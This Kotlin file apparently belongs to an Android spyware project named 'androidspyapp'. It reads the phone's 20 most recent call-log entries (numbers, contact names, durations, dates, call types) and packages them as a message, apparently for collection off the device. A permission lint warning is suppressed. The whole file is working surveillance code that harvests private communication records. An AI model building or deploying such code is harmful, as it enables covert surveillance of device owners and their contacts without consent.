package com.komnacki.androidspyapp.calllog

import android.annotation.SuppressLint
import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import android.util.Log
import com.komnacki.androidspyapp.Message


public class CalllogState(override var context: Context) : Message {
    init {
        Log.d("KK: ", "CallogState")
        getCallogState(
            context
        )
    }
    companion object {
        private val info : MutableMap<String, Any> = mutableMapOf()

        @SuppressLint("MissingPermission")
        fun getCallogState(context: Context) {
            val c : Cursor? = context.contentResolver
                .query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")
            val logs = mutableListOf<com.komnacki.androidspyapp.calllog.Log>()
            
            Log.d("KK: ", "initialize callog cursor")
            

            if(c != null) {
                var index = 0
                while (c.moveToNext() && index < 20) {
                    val number = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER))
                    val name = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME))
                    val duration = c.getString(c.getColumnIndex(CallLog.Calls.DURATION))
                    val date = c.getString(c.getColumnIndex(CallLog.Calls.DATE))
                    val type = when(c.getString(c.getColumnIndex(CallLog.Calls.TYPE)).toInt()) {
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
                        else -> "Unknown"
                    }

                    val log = Log(
                        number,
                        name,
                        duration,
                        date,
                        type
                    )
                    Log.d("KK: ", "log: " + log)
                    info[log.date + "-" + log.name] = log
                    index++
                }
                c.close()
            }
        }
    }

    override fun getData(): Map<String, Any> {
        return info
    }
}
